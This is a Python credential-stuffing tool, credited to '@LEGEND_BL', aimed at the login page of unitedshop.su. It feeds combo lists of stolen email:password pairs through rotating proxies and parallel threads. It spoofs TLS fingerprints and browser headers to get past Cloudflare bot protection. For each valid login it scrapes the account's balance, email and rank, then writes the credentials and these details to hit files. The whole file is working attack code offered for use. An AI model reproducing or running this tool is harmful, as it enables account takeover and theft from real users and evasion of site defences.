import os
import random
import requests
import time
import warnings
import threading
import shutil
import re
import json
from queue import Queue
from datetime import datetime
from colorama import init, Fore, Style
from user_agent import generate_user_agent

# Advanced bypass libraries
try:
    import cloudscraper
    CLOUDSCRAPER = True
except ImportError:
    CLOUDSCRAPER = False

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI = True
except ImportError:
    CURL_CFFI = False

try:
    import tls_client
    TLS_CLIENT = True
except ImportError:
    TLS_CLIENT = False

warnings.filterwarnings("ignore")
init(autoreset=True)

# Code By - @LEGEND_BL
# Advanced Unitedshop Checker with TLS Fingerprinting & Full Account Capture

# Browser fingerprint configurations
CHROME_VERSIONS = ['119', '120', '121', '122', '123', '124']
FIREFOX_VERSIONS = ['120', '121', '122', '123']

TLS_PROFILES = [
    'chrome_120', 'chrome_119', 'chrome_118',
    'firefox_120', 'firefox_119',
    'safari_15_6_1', 'safari_16_0',
]

def get_chrome_headers(version=None):
    """Generate realistic Chrome headers with TLS-like fingerprint"""
    v = version or random.choice(CHROME_VERSIONS)
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": f'"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Cache-Control": "max-age=0",
        "DNT": "1",
    }

def get_firefox_headers(version=None):
    """Generate realistic Firefox headers"""
    v = version or random.choice(FIREFOX_VERSIONS)
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "DNT": "1",
    }

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'═'*columns}")
print(f"{Fore.CYAN}{'UNITEDSHOP.SU ADVANCED CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
print(f"{Fore.CYAN}{'═'*columns}")
print(f"{Fore.GREEN}{'[TLS Fingerprint: ON] [Full Capture: ON]'.center(columns)}")
libs = []
if CLOUDSCRAPER: libs.append("CloudScraper")
if CURL_CFFI: libs.append("curl_cffi")
if TLS_CLIENT: libs.append("tls_client")
if libs:
    print(f"{Fore.GREEN}{f'[Libraries: {', '.join(libs)}]'.center(columns)}")
print(f"{Fore.CYAN}{'═'*columns}\n")

combo_input = input(f"{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"

def load_combos(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def load_proxies(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
            return proxies if proxies else []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    
    if "://" in p:
        protocol = p.split("://")[0].lower()
        rest = p.split("://", 1)[1]
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            return None
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
            else:
                proxy_url = f"{protocol}://{rest}"
        else:
            proxy_url = f"{protocol}://{rest}"
        return {"http": proxy_url, "https": proxy_url}
    
    elif "@" in p:
        auth_part, host_part = p.rsplit("@", 1)
        if ":" in auth_part:
            username, password = auth_part.split(":", 1)
            proxy_url = f"http://{username}:{password}@{host_part}"
            return {"http": proxy_url, "https": proxy_url}
    
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

combos = load_combos(combo_file)
proxies = load_proxies(proxy_file)

if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()

use_proxies = True
if not proxies:
    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
    if mode_input == 'y':
        use_proxies = False
        print(f"{Fore.YELLOW}[*] Proxy-less mode\n")
    else:
        input(f"\n{Fore.RED}Proxies required! Press Enter to exit...")
        exit()

if use_proxies:
    threads_input = input(f"{Fore.CYAN}Threads (1-30, default 5): {Style.RESET_ALL}").strip()
    threads_count = max(1, min(30, int(threads_input) if threads_input.isdigit() else 5))
else:
    threads_count = 1

print(f"\n{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}")
print(f"{Fore.BLUE}[*] Starting advanced checker with TLS fingerprinting...\n")

hit_counter = fail_counter = cf_blocked = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0

def extract_csrf(html):
    """Extract CSRF token from HTML"""
    patterns = [
        r'name=["\']?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']',
        r'name=["\']?_token["\']?\s*value=["\']([^"\']+)["\']',
        r'<meta[^>]+name=["\']?csrf[_-]?token["\']?[^>]+content=["\']([^"\']+)["\']',
        r'"csrfToken":\s*"([^"]+)"',
        r'"_token":\s*"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html, re.I)
        if match:
            return match.group(1)
    return ""

def capture_account_details(session, headers, proxy_dict):
    """Capture full account details after successful login"""
    details = {
        "balance": "N/A",
        "username": "N/A",
        "email": "N/A",
        "level": "N/A",
        "registered": "N/A",
        "orders": "N/A",
        "deposits": "N/A",
    }
    
    try:
        # Try dashboard page
        dashboard_urls = [
            "https://unitedshop.su/dashboard",
            "https://unitedshop.su/panel",
            "https://unitedshop.su/account",
            "https://unitedshop.su/profile",
            "https://unitedshop.su/home",
        ]
        
        for url in dashboard_urls:
            try:
                r = session.get(url, headers=headers, proxies=proxy_dict, timeout=20, verify=False)
                if r.status_code == 200:
                    html = r.text
                    
                    # Extract balance
                    balance_patterns = [
                        r'balance["\s:]+\$?([\d.,]+)',
                        r'Balance:\s*\$?([\d.,]+)',
                        r'>\$?([\d.,]+)\s*</span>\s*balance',
                        r'wallet["\s:]+\$?([\d.,]+)',
                    ]
                    for p in balance_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["balance"] = f"${m.group(1)}"
                            break
                    
                    # Extract username
                    username_patterns = [
                        r'username["\s:]+([^"<>\s,]+)',
                        r'Username:\s*([^<>\s,]+)',
                        r'user["\s:]+([^"<>\s,]+)',
                    ]
                    for p in username_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["username"] = m.group(1)
                            break
                    
                    # Extract email
                    email_pattern = r'[\w\.-]+@[\w\.-]+\.\w+'
                    m = re.search(email_pattern, html)
                    if m:
                        details["email"] = m.group(0)
                    
                    # Extract level/rank
                    level_patterns = [
                        r'level["\s:]+([^"<>\s,]+)',
                        r'rank["\s:]+([^"<>\s,]+)',
                        r'tier["\s:]+([^"<>\s,]+)',
                    ]
                    for p in level_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["level"] = m.group(1)
                            break
                    
                    # Extract registration date
                    date_patterns = [
                        r'registered["\s:]+([^"<>,]+)',
                        r'joined["\s:]+([^"<>,]+)',
                        r'member since["\s:]+([^"<>,]+)',
                    ]
                    for p in date_patterns:
                        m = re.search(p, html, re.I)
                        if m:
                            details["registered"] = m.group(1).strip()
                            break
                    
                    # If we found balance, we likely have valid data
                    if details["balance"] != "N/A":
                        break
                        
            except:
                continue
        
        # Try API endpoints for more data
        api_urls = [
            "https://unitedshop.su/api/user",
            "https://unitedshop.su/api/profile",
            "https://unitedshop.su/api/account",
        ]
        
        for url in api_urls:
            try:
                r = session.get(url, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if "balance" in data:
                            details["balance"] = f"${data['balance']}"
                        if "username" in data:
                            details["username"] = data["username"]
                        if "email" in data:
                            details["email"] = data["email"]
                        if "level" in data:
                            details["level"] = data["level"]
                        break
                    except:
                        pass
            except:
                continue
                
    except Exception as e:
        pass
    
    return details

def check_with_tls_client(email, pwd, proxy_dict):
    """Check using tls_client for best TLS fingerprinting"""
    if not TLS_CLIENT:
        return None, None, None
    
    try:
        session = tls_client.Session(
            client_identifier=random.choice(["chrome_120", "chrome_119", "firefox_120"]),
            random_tls_extension_order=True
        )
        
        if proxy_dict:
            session.proxies = proxy_dict
        
        headers = get_chrome_headers()
        
        # Get login page
        r1 = session.get("https://unitedshop.su/login", headers=headers)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare", None
        
        csrf = extract_csrf(r1.text)
        
        # Login
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://unitedshop.su"
        headers["Referer"] = "https://unitedshop.su/login"
        
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        r = session.post("https://unitedshop.su/login", headers=headers, data=data, allow_redirects=True)
        
        txt = r.text.lower()
        url = str(r.url).lower()
        
        if any(x in url for x in ["dashboard", "panel", "account", "home"]) and "login" not in url:
            details = capture_account_details(session, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            details = capture_account_details(session, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials", None
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_with_curl_cffi(email, pwd, proxy_dict):
    """Check using curl_cffi for TLS fingerprinting"""
    if not CURL_CFFI:
        return None, None, None
    
    try:
        impersonate = random.choice(['chrome120', 'chrome119', 'chrome110', 'safari15_5'])
        
        # Get login page
        r1 = curl_requests.get("https://unitedshop.su/login",
                               impersonate=impersonate,
                               proxies=proxy_dict,
                               timeout=35,
                               verify=False)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare", None
        
        csrf = extract_csrf(r1.text)
        
        # Login
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        r = curl_requests.post("https://unitedshop.su/login",
                               data=data,
                               impersonate=impersonate,
                               proxies=proxy_dict,
                               timeout=35,
                               verify=False,
                               allow_redirects=True)
        
        txt = r.text.lower()
        url = str(r.url).lower()
        
        if any(x in url for x in ["dashboard", "panel", "account", "home"]) and "login" not in url:
            # Capture account details
            details = {"balance": "N/A", "username": email}
            
            # Try to get more details
            for endpoint in ["/dashboard", "/profile", "/account"]:
                try:
                    r2 = curl_requests.get(f"https://unitedshop.su{endpoint}",
                                           impersonate=impersonate,
                                           proxies=proxy_dict,
                                           timeout=20,
                                           verify=False)
                    if r2.status_code == 200:
                        # Extract balance
                        m = re.search(r'balance["\s:]+\$?([\d.,]+)', r2.text, re.I)
                        if m:
                            details["balance"] = f"${m.group(1)}"
                            break
                except:
                    pass
            
            return "hit", "Valid", details
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            return "hit", "Valid", {"balance": "N/A", "username": email}
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials", None
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_with_cloudscraper(email, pwd, proxy_dict):
    """Check using CloudScraper"""
    if not CLOUDSCRAPER:
        return None, None, None
    
    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': random.choice(['chrome', 'firefox']),
                'platform': random.choice(['windows', 'darwin', 'linux']),
                'desktop': True
            },
            delay=random.randint(5, 15)
        )
        
        headers = random.choice([get_chrome_headers, get_firefox_headers])()
        
        # Get login page
        r1 = scraper.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=35)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare", None
        
        csrf = extract_csrf(r1.text)
        
        # Login
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://unitedshop.su"
        headers["Referer"] = "https://unitedshop.su/login"
        
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        r = scraper.post("https://unitedshop.su/login", data=data, headers=headers,
                         proxies=proxy_dict, timeout=35, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "account", "home"]) and "login" not in url:
            details = capture_account_details(scraper, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            details = capture_account_details(scraper, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials", None
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_with_requests(email, pwd, proxy_dict):
    """Standard requests fallback"""
    s = requests.Session()
    headers = get_chrome_headers()
    
    try:
        r1 = s.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=35, verify=False)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare", None
        
        csrf = extract_csrf(r1.text)
        
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://unitedshop.su"
        headers["Referer"] = "https://unitedshop.su/login"
        
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        r = s.post("https://unitedshop.su/login", data=data, headers=headers,
                   proxies=proxy_dict, timeout=35, verify=False, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "account", "home"]) and "login" not in url:
            details = capture_account_details(s, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            details = capture_account_details(s, headers, proxy_dict)
            return "hit", "Valid", details
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials", None
        return "fail", f"Status {r.status_code}", None
        
    except Exception as e:
        return "error", str(e)[:30], None

def check_account(email, pwd, proxy_dict):
    """Check account using multiple methods with TLS fingerprinting"""
    
    # Method 1: tls_client (best TLS fingerprint)
    if TLS_CLIENT:
        result, reason, details = check_with_tls_client(email, pwd, proxy_dict)
        if result and result not in ["error", "cf_blocked"]:
            return result, reason, details
    
    # Method 2: curl_cffi (good TLS fingerprint)
    if CURL_CFFI:
        result, reason, details = check_with_curl_cffi(email, pwd, proxy_dict)
        if result and result not in ["error", "cf_blocked"]:
            return result, reason, details
    
    # Method 3: CloudScraper
    if CLOUDSCRAPER:
        result, reason, details = check_with_cloudscraper(email, pwd, proxy_dict)
        if result and result not in ["error", "cf_blocked"]:
            return result, reason, details
    
    # Method 4: Standard requests
    result, reason, details = check_with_requests(email, pwd, proxy_dict)
    return result, reason, details

def format_details(details):
    """Format account details for display"""
    if not details:
        return ""
    parts = []
    if details.get("balance", "N/A") != "N/A":
        parts.append(f"Balance: {details['balance']}")
    if details.get("username", "N/A") != "N/A":
        parts.append(f"User: {details['username']}")
    if details.get("level", "N/A") != "N/A":
        parts.append(f"Level: {details['level']}")
    if details.get("email", "N/A") != "N/A":
        parts.append(f"Email: {details['email']}")
    return " | ".join(parts) if parts else ""

def worker(q):
    global result_counter, hit_counter, fail_counter, cf_blocked
    while True:
        try:
            combo = q.get_nowait()
        except:
            break
        
        email, pwd = combo.split(":", 1)
        proxy_dict = None
        
        if use_proxies:
            for _ in range(3):
                proxy_str = random.choice(proxies)
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict: break
            
            if not proxy_dict:
                with counters_lock: fail_counter += 1
                with counters_lock: num = result_counter + 1; result_counter = num
                with print_lock:
                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
                q.task_done()
                continue
        
        result, reason, details = "error", "Unknown", None
        for attempt in range(3):
            result, reason, details = check_account(email, pwd, proxy_dict)
            if result not in ["error"]:
                break
            time.sleep(5 + attempt * 3)
        
        with counters_lock: num = result_counter + 1; result_counter = num
        
        if result == "hit":
            with counters_lock: hit_counter += 1
            detail_str = format_details(details)
            
            # Save to file with full details
            with open("Unitedshop_Hits.txt", "a", encoding="utf-8") as f:
                if details:
                    f.write(f"{email}:{pwd} | {detail_str} | {datetime.now().strftime('%Y-%m-%d %H:%M')} | @LEGEND_BL\n")
                else:
                    f.write(f"{email}:{pwd} | Valid | @LEGEND_BL\n")
            
            # Also save detailed JSON
            if details:
                with open("Unitedshop_Hits_Detailed.json", "a", encoding="utf-8") as f:
                    json.dump({
                        "email": email,
                        "password": pwd,
                        "details": details,
                        "timestamp": datetime.now().isoformat()
                    }, f)
                    f.write("\n")
            
            with print_lock:
                if detail_str:
                    print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | {Fore.CYAN}{detail_str}")
                else:
                    print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Status: Valid")
                    
        elif result == "cf_blocked":
            with counters_lock: cf_blocked += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.YELLOW}{email}:{pwd} | Cloudflare blocked")
        else:
            with counters_lock: fail_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
        
        q.task_done()
        time.sleep(5)

def main():
    q = Queue()
    for c in combos:
        q.put(c)
    
    # Clear output files
    open("Unitedshop_Hits.txt", "w").close()
    open("Unitedshop_Hits_Detailed.json", "w").close()
    
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
    
    q.join()
    
    print(f"\n{Fore.CYAN}{'═'*50}")
    print(f"{Fore.CYAN}FINISHED!")
    print(f"{Fore.CYAN}{'═'*50}")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter} | {Fore.YELLOW}CF Blocked: {cf_blocked}")
    print(f"{Fore.CYAN}Hits saved to: Unitedshop_Hits.txt")
    print(f"{Fore.CYAN}Detailed JSON: Unitedshop_Hits_Detailed.json")
    
    if cf_blocked > 0:
        print(f"\n{Fore.YELLOW}[!] Site has strong Cloudflare protection")
        print(f"{Fore.YELLOW}[!] Try: pip install tls-client curl_cffi cloudscraper")
    
    input(f"\nPress Enter to exit...")

if __name__ == "__main__":
    main()
